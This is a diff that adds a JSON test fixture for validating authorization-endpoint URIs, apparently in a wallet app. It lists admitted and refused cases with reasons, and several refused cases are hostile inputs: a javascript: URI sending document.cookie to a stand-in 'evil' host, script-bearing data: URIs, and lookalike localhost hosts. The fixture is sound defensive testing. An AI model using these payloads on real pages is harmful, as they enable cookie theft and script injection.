@@ -1,0 +1,77 @@
+[
+  {
+    "uri": "https://issuer.example/authorize?client_id=x",
+    "expected": "admit",
+    "why": "https is the production authorization scheme"
+  },
+  {
+    "uri": "javascript:fetch(\"//evil/\"+document.cookie)",
+    "expected": "refuse",
+    "why": "javascript runs in the opener origin"
+  },
+  {
+    "uri": "JavaScript:alert(1)",
+    "expected": "refuse",
+    "why": "scheme match is case-insensitive"
+  },
+  {
+    "uri": "data:text/html,<script>alert(1)</script>",
+    "expected": "refuse",
+    "why": "data documents are not an authorization endpoint"
+  },
+  {
+    "uri": "blob:https://issuer.example/abc",
+    "expected": "refuse",
+    "why": "blob documents are not an authorization endpoint"
+  },
+  {
+    "uri": "http://issuer.example/authorize",
+    "expected": "refuse",
+    "why": "plain http to a remote host is refused"
+  },
+  {
+    "uri": "http://localhost:18080/authorize",
+    "expected": "admit",
+    "why": "loopback http is admitted for local development issuers"
+  },
+  {
+    "uri": "http://127.0.0.1:18080/authorize",
+    "expected": "admit",
+    "why": "loopback http is admitted for local development issuers"
+  },
+  {
+    "uri": "http://[::1]:18080/authorize",
+    "expected": "admit",
+    "why": "IPv6 loopback http is admitted for local development issuers"
+  },
+  {
+    "uri": "http://localhost.evil.com/authorize",
+    "expected": "refuse",
+    "why": "loopback is matched on the host, never as a substring"
+  },
+  {
+    "uri": "http://evil.com/authorize?next=localhost",
+    "expected": "refuse",
+    "why": "loopback is matched on the host, never as a substring"
+  },
+  {
+    "uri": "/authorize",
+    "expected": "refuse",
+    "why": "a relative value would navigate inside the wallet itself"
+  },
+  {
+    "uri": "authorize",
+    "expected": "refuse",
+    "why": "a relative value would navigate inside the wallet itself"
+  },
+  {
+    "uri": "",
+    "expected": "refuse",
+    "why": "an empty value is not an authorization endpoint"
+  },
+  {
+    "uri": "   ",
+    "expected": "refuse",
+    "why": "a blank value is not an authorization endpoint"
+  }
+]
